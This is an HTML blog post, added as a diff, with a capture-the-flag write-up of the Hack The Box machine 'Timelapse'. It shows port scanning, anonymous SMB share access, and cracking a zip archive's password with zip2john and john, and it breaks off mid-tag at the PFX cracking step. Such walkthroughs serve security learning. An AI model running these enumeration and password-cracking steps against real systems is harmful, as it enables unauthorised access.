@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>HTB Machine — Timelapse&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="HTB Machine — Timelapse">
+  
+    <meta name="description" content="Timelapse is a simple Windows box that emphasizes on the importance of enumeration. In fact, the box can be rooted entirely through diligent recon, without relying on any exploits. It starts with accessing an open SMB share and finding an encrypted PFX file, which I’ll crack using john and use it to login to the box. From there, I’ll find credentials in a PowerShell history file, which helps me move to another user that can read the Administrator password via LAPS.">
+    <meta property="og:description" content="Timelapse is a simple Windows box that emphasizes on the importance of enumeration. In fact, the box can be rooted entirely through diligent recon, without relying on any exploits. It starts with accessing an open SMB share and finding an encrypted PFX file, which I’ll crack using john and use it to login to the box. From there, I’ll find credentials in a PowerShell history file, which helps me move to another user that can read the Administrator password via LAPS.">
+  
+  
+    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png">
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="/">
+    <div class="Navbar__Btn">
+      
+        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
+      
+      <span>Home</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://github.com/ch3ng625", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
+      <span>GitHub</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
+      <span>LinkedIn</span>
+    </div>
+  </a>
+  <span class="Navbar__Delim">&centerdot;</span>
+  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
+    <div class="Navbar__Btn">
+      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
+      <span>HackTheBox</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+</nav>
+
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+      <div class="Header__Icon">
+        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png"></span>
+      </div>
+    
+    <h1 class="Header__Title">HTB Machine — Timelapse</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Jan 21, 2024</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
+            <a href="tag/HTB">HTB</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/Windows">Windows</a>
+          </span>
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--green">
+            <a href="tag/Easy">Easy</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/35cf326e295840688b290a06c52ff8c4" class="PageRoot"><h3 id="https://www.notion.so/8c43c1880de243d6a240bfcb84e919d1" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/8c43c1880de243d6a240bfcb84e919d1"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/1af7a4b06bae4b919e22e8d2d2892c2b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Timelapse is a simple Windows box that emphasizes on the importance of enumeration. In fact, the box can be rooted entirely through diligent recon, without relying on any exploits. It starts with accessing an open SMB share and finding an encrypted PFX file, which I’ll crack using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">john</code></span><span class="SemanticString"> and use it to login to the box. From there, I’ll find credentials in a PowerShell history file, which helps me move to another user that can read the Administrator password via LAPS.</span></span></p></div><div id="https://www.notion.so/b4348d4ffe69413784a9e12332941968" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/7f89c7e018ce47f1ac2d54fb86641375" class="Divider"></div><h3 id="https://www.notion.so/6422f16a9209403b9d58f876d5fcf83b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/6422f16a9209403b9d58f876d5fcf83b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/fc71ba1844f44a37b28acbeb28325732" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><div id="https://www.notion.so/5eb32cc40cff42efaa3098e74b5377b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nmap --min-rate 1000 -p- 10.129.227.113</code></span></span></p></div><pre id="https://www.notion.so/a166487266fc4804a56d512884f9508e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 18:38 ACDT
+Nmap scan report for 10.129.227.113
+Host is up (0.25s latency).
+Not shown: 65518 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49731/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 133.08 seconds</span></span></span></code></pre><div id="https://www.notion.so/5df5503c84e64773b61f1aef7b1f2ed1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s many ports open, which is normal for a Windows machine. I’ll run a targeted scan on each of these to get more information.</span></span></p></div><div id="https://www.notion.so/9b4d879e1b434186a214a686acea734a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nmap -A -p 53,88,135,139,445,464,593,636,3268,3269,5986,9389,49673,49674,49731 10.129.227.113</code></span></span></p></div><pre id="https://www.notion.so/cbead7a72ae74db9ba326d8c9baf9dfa" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-01-20 16:16:22Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_ssl-date: 2024-01-20T16:18:02+00:00; +7h59m38s from scanner time.
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after:  2022-10-25T14:25:29
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Not Found
+9389/tcp  open  mc-nmf            .NET Message Framing
+49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc             Microsoft Windows RPC
+49731/tcp open  msrpc             Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019 (88%)
+Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h59m37s, deviation: 0s, median: 7h59m37s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-01-20T16:17:25
+|_  start_date: N/A
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   251.23 ms 10.10.14.1
+2   252.01 ms 10.129.227.113</span></span></span></code></pre><div id="https://www.notion.so/4dd0b1f2f971429f87eab38b5e75c8dc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The presence of DNS, Kerberos, RPC, LDAP and SMB indicates that it’s likely a domain controller. WinRM is also open on port 5986, and the scan revealed a domain name and a hostname. I added them to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/ada40c701974488bbe56fa878e089ce8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span># HTB machine Timelapse
+10.129.227.113 timelapse.htb dc01.timelapse.htb</span></span></span></code></pre><div id="https://www.notion.so/ae83a5b3c02d40c7bb974023719f0640" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP445 — SMB:</strong></span></span></p></div><div id="https://www.notion.so/873f91c0f7404f359b121587b8324978" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With SMB, I’ll always check if it allows null sessions:</span></span></p></div><div id="https://www.notion.so/91bd158eb85a46f99654a939ed3acf15" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ crackmapexec smb 10.129.227.113 --shares -u &#x27;&#x27; -p &#x27;&#x27;</code></span></span></p></div><pre id="https://www.notion.so/f047b8e58d4241adb8cf4a74837032fa" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>SMB         10.129.227.113  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB         10.129.227.113  445    DC01             [+] timelapse.htb\: 
+SMB         10.129.227.113  445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED</span></span></span></code></pre><div id="https://www.notion.so/8817017a87754e6cb28a8ad2ef6a86ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The server returned “Access Denied”. However setting the username as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Anonymous</code></span><span class="SemanticString"> seems to work, as it returned a list of shares.</span></span></p></div><div id="https://www.notion.so/9e41fa2416a54bc4a634a24b6aee362e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ crackmapexec smb 10.129.227.113 --shares -u &#x27;Anonymous&#x27; -p &#x27;&#x27;</code></span></span></p></div><pre id="https://www.notion.so/5d7880338b554c82a3c31cfe379263a0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>SMB         10.129.227.113  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB         10.129.227.113  445    DC01             [+] timelapse.htb\Anonymous: 
+SMB         10.129.227.113  445    DC01             [+] Enumerated shares
+SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
+SMB         10.129.227.113  445    DC01             -----           -----------     ------
+SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.227.113  445    DC01             C$                              Default share
+SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
+SMB         10.129.227.113  445    DC01             Shares          READ            
+SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share</span></span></span></code></pre><div id="https://www.notion.so/542346b99c0b43d7a0e1526c174c987b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Only </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Shares</code></span><span class="SemanticString"> is the non-default share. I connected to it with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">smbclient</code></span><span class="SemanticString"> to take a further look.</span></span></p></div><div id="https://www.notion.so/eac6c1a238dc402a8689a77bf6d1b22a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ smbclient -U &#x27;Anonymous&#x27; -N \\\\10.129.227.113\\Shares</code></span></span></p></div><div id="https://www.notion.so/b3f5ad6652b04c1c9968548132b86bc6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ls</code></span></span></p></div><pre id="https://www.notion.so/5c8b313a689c4b428af19d218cd8a758" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>  .                                   D        0  Tue Oct 26 02:09:15 2021
+  ..                                  D        0  Tue Oct 26 02:09:15 2021
+  Dev                                 D        0  Tue Oct 26 06:10:06 2021
+  HelpDesk                            D        0  Tue Oct 26 02:18:42 2021
+
+		6367231 blocks of size 4096. 1339140 blocks available</span></span></span></code></pre><div id="https://www.notion.so/2db8a1ae493a432aad2765f7d2ac79db" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It has two folders: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Dev</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">HelpDesk</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/d85612fe66944dbd9c3ac1a6bc2bb129" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/156091912bac4eb9a47d2a6390b10e02" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cd Dev</code></span></span></p></div><div id="https://www.notion.so/e3d1c19832ce42219e04073b5d6c3505" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ls</code></span></span></p></div><pre id="https://www.notion.so/a18578b83e3e475a97fd382ef8f30b2a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>  .                                   D        0  Tue Oct 26 06:10:06 2021
+  ..                                  D        0  Tue Oct 26 06:10:06 2021
+  winrm_backup.zip                    A     2611  Tue Oct 26 02:16:42 2021
+
+		6367231 blocks of size 4096. 1338994 blocks available</span></span></span></code></pre><div id="https://www.notion.so/9c5a34088ef0488bbf32a001b225cdc8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Dev</code></span><span class="SemanticString"> has a single zip file, which I downloaded. Judging by its name, it may be useful for WinRM login.</span></span></p></div><div id="https://www.notion.so/0f0e62b0d4d74d11af16671c6c2a1002" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ get winrm_backup.zip</code></span></span></p></div><div id="https://www.notion.so/133e1daae869461fb4392298aa8c71e0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/314d738861e64802962dc275671fbcdf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cd ../HelpDesk</code></span></span></p></div><div id="https://www.notion.so/8ef8e8288e494dd38b77aed14bea4cc7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ls</code></span></span></p></div><pre id="https://www.notion.so/ff8827ff8d784866967439adc9b67bc8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>  .                                   D        0  Tue Oct 26 02:18:42 2021
+  ..                                  D        0  Tue Oct 26 02:18:42 2021
+  LAPS.x64.msi                        A  1118208  Tue Oct 26 01:27:50 2021
+  LAPS_Datasheet.docx                 A   104422  Tue Oct 26 01:27:46 2021
+  LAPS_OperationsGuide.docx           A   641378  Tue Oct 26 01:27:40 2021
+  LAPS_TechnicalSpecification.docx      A    72683  Tue Oct 26 01:27:44 2021
+
+		6367231 blocks of size 4096. 1337922 blocks available</span></span></span></code></pre><div id="https://www.notion.so/1fb6503c22a34cf39e77e62349775a59" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">HelpDesk</code></span><span class="SemanticString"> folder contains several LAPS documents, as well as its MSI installer. This suggests that LAPS is running on the box. We’ll come back to this later.</span></span></p></div><div id="https://www.notion.so/4bc55d22a264484989a189b782a8c2a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Zip Archive:</strong></span></span></p></div><div id="https://www.notion.so/e8b3cb329035497b9630821e1583ed37" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F045bb509-92e2-4e03-a6e9-10c4ecb240b5%2FUntitled.png?width=759&amp;table=block&amp;id=e8b3cb32-9035-497b-9630-821e1583ed37"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F045bb509-92e2-4e03-a6e9-10c4ecb240b5%2FUntitled.png?width=759&amp;table=block&amp;id=e8b3cb32-9035-497b-9630-821e1583ed37" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/9c4f2ee8c8ed40d49b1a4e79bafda7f5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The archive contains a single PFX file, but I can’t access it just yet, since the zip file is password-encrypted.</span></span></p></div><div id="https://www.notion.so/175697a5afd248de9bafcbd3b747c9c0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ unzip winrm_backup.zip</code></span></span></p></div><pre id="https://www.notion.so/d9427f42a5a34d9abadbc302fd3aae36" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+   skipping: legacyy_dev_auth.pfx    incorrect password</span></span></span></code></pre><div id="https://www.notion.so/9e2dc138f12f48a8bd52d4f396c0c964" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I first extracted the hash using </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">zip2john</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/0b3733fd40b9462e9f39f3bf0e5602f0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ zip2john winrm_backup.zip &gt; zip.hash</code></span></span></p></div><div id="https://www.notion.so/7318c5d4313948a59829b8a9683f792b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat zip.hash</code></span></span></p></div><pre id="https://www.notion.so/77fc056d1fac4eb7bf651dc7eee372d5" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b5ca7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7&lt;..SNIP..&gt;3156404a17e2f7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip</span></span></span></code></pre><div id="https://www.notion.so/139851fde26545aca5b5ac6c9a7e4022" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then cracked it to obtain the password </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">supremelegacy</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/ad9715dd0b3b41da853e6d69d6d94d08" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash</code></span></span></p></div><pre id="https://www.notion.so/07ee8284e86e4d9a942c2131edeef790" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:00 DONE (2024-01-20 19:07) 1.315g/s 4570Kp/s 4570Kc/s 4570KC/s swimfan12..superkebab
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/d3d84c827e6644709b6ddbc65eb2702e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With this password, I unzipped the archive successfully.</span></span></p></div><div id="https://www.notion.so/a40301fb63cf4adc9d903ab1e9b4466e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ unzip winrm_backup.zip</code></span></span></p></div><pre id="https://www.notion.so/64457c3cad08486789b0687b4ca39390" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: 
+  inflating: legacyy_dev_auth.pfx</span></span></span></code></pre><div id="https://www.notion.so/053e02b3409847f9a2e70af05f9f17a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">PFX File:</strong></span></span></p></div><div id="https://www.notion.so/c47a5f98a20d4507b5926ab96532cb36" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">PFX (Personal Exchange Format) files are essentially multiple certificates bundled together in PKCS#12 format, and typically contains a public and private key pair.</span></span></p></div><div id="https://www.notion.so/1dffeb02b906482693030484c6302c0d" class="Bookmark"><a href="https://sphere10.com/articles/how-to/computer-security/understanding-pem-and-pfx-files"><h5 class="Bookmark__Title">Understanding PEM and PFX Files</h5><p class="Bookmark__Desc">Digital certificates and cryptographic information are essential components in securing online transactions and communications.</p><p class="Bookmark__Link">https://sphere10.com/articles/how-to/computer-security/understanding-pem-and-pfx-files</p></a></div><div id="https://www.notion.so/0f61dcd613284572bd75958204a0cce3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Opening the PFX file also requires a password.</span></span></p></div><div id="https://www.notion.so/26865443f1634021ae53b202729bdd45" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0594c52d-d047-491e-9e20-36ec7ccb85aa%2FUntitled.png?width=504&amp;table=block&amp;id=26865443-f163-4021-ae53-b202729bdd45"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F0594c52d-d047-491e-9e20-36ec7ccb85aa%2FUntitled.png?width=504&amp;table=block&amp;id=26865443-f163-4021-ae53-b202729bdd45" style="width:504px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/61a32e6aba5240c5b1c5bb3d76a28d63" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Similar to above, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pfx2john</code></span><span class="SemanticString"> can be used to extract the hash out.</span></span></p></div><div id="https://www.notion.so/f741ac35f5254f0cad0e81a3190d5287" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code 